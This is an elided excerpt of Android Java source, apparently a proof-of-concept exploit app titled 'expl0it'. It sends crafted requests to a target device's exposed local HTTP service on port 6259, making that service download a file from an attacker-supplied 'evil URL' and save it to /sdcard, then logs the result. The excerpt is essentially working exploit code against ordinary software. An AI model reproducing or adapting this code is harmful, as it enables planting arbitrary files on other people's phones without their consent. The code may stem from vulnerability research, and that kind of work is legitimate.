...
public class Downloadfile extends ActionBarActivity {
    ...
    private EditText mEvilUrl = null;
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        setTitle("expl0it > "+ target + " > downloadfile");
        mBaseUrl = "http://" + target + ":6259/downloadfile?" + "callback=x&mcmdf=inapp_x";

        mEvilUrl = (EditText)findViewById(R.id.evilurl);
        m_btSend = (Button)findViewById(R.id.makevisit);


        mResultView = (TextView) findViewById(R.id.downloadfile_result);
        ...
        m_btSend.setOnClickListener(new View.OnClickListener() {
            ...
            public void onClick(View v) {
                String strEvilUrl = mEvilUrl.getText().toString();

                if(strEvilUrl != null){
                    mRequestUrl = mBaseUrl+ "&"+"querydown=download&"+"savepath=%2Fsdcard&"
                            +"filesize=1377&" + "downloadurl=" + GenRequestUrl(strEvilUrl);
                }else
                ...
                new Thread() {
                    ...
                    public void run() {
                        try {
                            ...
                            Log.d("heen", "downloadfile result =" + mResult);
